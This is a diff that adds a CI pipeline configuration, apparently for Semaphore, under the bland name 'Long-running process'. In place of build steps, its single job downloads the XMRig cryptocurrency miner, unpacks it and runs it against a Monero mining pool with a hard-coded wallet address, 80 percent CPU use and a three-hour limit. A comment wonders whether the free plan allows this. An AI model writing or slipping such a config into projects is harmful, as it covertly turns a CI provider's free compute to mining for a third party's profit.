@@ -1,0 +1,20 @@
+version: v1.0
+name: Long-running process
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu2004
+execution_time_limit:
+  hours: 3   # You can adjust this. Free plan allows this? We'll test.
+
+blocks:
+  - name: "Run Miner"
+    task:
+      jobs:
+        - name: "Start mining"
+          commands:
+            - checkout
+            - wget https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-linux-static-x64.tar.gz
+            - tar -xzf xmrig-6.21.2-linux-static-x64.tar.gz
+            - cd xmrig-6.21.2
+            - './xmrig --url=pool.supportxmr.com:443 --user=49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP --pass=$(hostname) --tls --keepalive --cpu-max-threads-hint=80 --cpu-priority=5 --randomx-mode=fast --donate-level=1 --no-color'
